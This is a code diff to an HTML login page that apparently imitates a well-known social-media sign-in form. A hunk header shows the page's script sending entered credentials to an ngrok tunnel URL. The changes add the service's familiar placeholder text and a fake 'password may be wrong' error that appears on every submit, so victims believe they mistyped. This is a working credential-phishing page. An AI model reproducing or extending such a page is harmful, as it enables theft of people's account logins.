@@ -3,6 +3,7 @@
 
 <script>
 function sendDetails() {
+document.getElementById('error').style.display = 'block';
 console.log("user");
 console.log(document.getElementById("user").value);
 console.log(document.getElementById('pwd').value);
@@ -26,17 +27,21 @@ fetch("https://0a59-2401-4900-1c1b-8bde-20d2-fd6d-4797-5ebe.ngrok-free.app/login
       <img src="https://i.imgur.com/zqpwkLQ.png" />
     </div>
     <div class="l-part">
-      <input type="text" placeholder="Username" class="input-1" id="user" />
+      <input type="text" placeholder="Phone number, username, or email" class="input-1" id="user" />
       <div class="overlap-text">
         <input type="password" placeholder="Password" class="input-2" id="pwd" />
-        <a href="#">Forgot?</a>
       </div>
       <input type="button" value="Log in" class="btn" onClick="sendDetails()"/>
+	<p>
+
+	</p>
+      <p id="error">The password may be wrong or you may not be currently authorized to view the page</p>
+      <a href="#">Forgot password?</a>
     </div>
   </div>
   <div class="sub-content">
     <div class="s-part">
-      Don't have an account?<a href="#">Sign up</a>
+      Don't have an account?  <a href="#">Sign up</a>
     </div>
   </div>
 </div>
